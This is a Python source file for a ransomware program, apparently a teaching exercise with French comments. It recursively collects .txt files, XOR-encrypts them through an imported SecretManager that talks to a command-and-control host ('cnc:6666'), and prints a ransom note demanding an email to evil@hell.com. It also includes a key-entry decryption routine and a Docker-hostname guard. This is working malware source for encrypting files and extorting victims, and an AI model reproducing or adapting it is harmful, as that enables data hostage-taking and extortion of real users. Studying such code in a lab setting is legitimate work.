import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)


    def get_files(self, filter:str) -> list:
        # create a Path object for the current directory
        current_dir = Path.cwd()
        # use rglob to recursively search for all files matching the filter
        matching_files = current_dir.rglob(filter)
        # convert the matching files to a list of absolute file paths
        file_paths = [str(file.absolute()) for file in matching_files if file.is_file()]
        return file_paths


    def encrypt(self):
        # main function for encrypting (see PDF)
        raise NotImplemented()
    
    def encrypt(self):
        # main function for encrypting (see PDF)
        files = self.get_files("*.txt")
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
        secret_manager.setup()
        secret_manager.xorfiles(files)

        print(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))
        # Chiffre les fichiers cibles puis affiche le message prédéfini et le token

    def decrypt(self):
        # main function for decrypting (see PDF)
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
        secret_manager.load()
        received_files = self.get_files("*.txt")
        while True:
            try:
                candidate_key = input("Entrez la clé fournie: ")
                secret_manager.set_key(candidate_key)
                secret_manager.xorfiles(received_files)
                print("Les fichiers ont été déchiffrés")
                break

            except ValueError as error:
                print("Error",{error},"La clé proposée est invalide")
        # Déchiffre les fichiers après avoir vérifié que la clé fournie est bien la bonne

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()